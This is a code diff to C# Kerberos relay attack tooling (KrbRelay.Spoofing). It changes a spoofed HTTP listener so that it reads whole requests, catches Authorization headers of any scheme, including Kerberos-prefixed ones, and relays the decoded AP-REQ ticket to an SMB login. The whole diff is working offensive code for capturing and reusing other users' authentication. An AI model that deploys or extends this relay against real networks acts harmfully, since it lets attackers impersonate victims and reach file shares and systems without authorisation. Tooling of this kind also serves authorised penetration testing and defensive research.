@@ -30,24 +30,35 @@ namespace KrbRelay.Spoofing
         public void Start()
         {
             this.listener.Start();
+            var result = "Access denied";
             while (true)
             {
                 var client = this.listener.AcceptTcpClient();
+                NetworkStream stream = client.GetStream();
                 var buffer = new byte[10240];
-                var stream = client.GetStream();
-                var length = stream.Read(buffer, 0, buffer.Length);
-                var result = "Access denied";
-                var incomingMessage = Encoding.UTF8.GetString(buffer, 0, length);
+                //var length = stream.Read(buffer, 0, buffer.Length);
+                //var incomingMessage = Encoding.UTF8.GetString(buffer, 0, length);
+
+                MemoryStream memoryStream = new MemoryStream();
+                int bytes = 0;
+                do
+                {
+                    bytes = stream.Read(buffer, 0, buffer.Length);
+                    memoryStream.Write(buffer, 0, bytes);
+                }
+                while (stream.DataAvailable);
+
+                string incomingMessage = Encoding.ASCII.GetString(memoryStream.ToArray());
                 Console.WriteLine("Incoming message: {0}", incomingMessage);
-                var myMatch = Regex.Matches(incomingMessage, "Authorization: Negotiate .*");
 
                 //relay 
                 string ticket = "";
                 string targetResp = "";
+                var myMatch = Regex.Matches(incomingMessage, "Authorization: .*");
                 if (myMatch.Count > 0)
                 {
                     ticket = myMatch[0].Value.Replace("Authorization: ","");
-                    //Console.WriteLine(ticket);
+                    //Console.WriteLine("[*] Got ticket: {0}", ticket);
                 }
                 Console.WriteLine();
                 
@@ -77,7 +88,6 @@ namespace KrbRelay.Spoofing
                         + result
                         + Environment.NewLine + Environment.NewLine);
                 stream.Write(msg, 0, msg.Length);
-                    
             }
         }
     }
@@ -130,7 +140,7 @@ namespace KrbRelay.Spoofing
         }
         public static string smbConnect(string ticket)
         {
-            byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", ""));
+            byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", "").Replace("Kerberos ", ""));
             byte[] resp = Program.smbClient.Login(apReq, out bool success);
             if (success)
             {
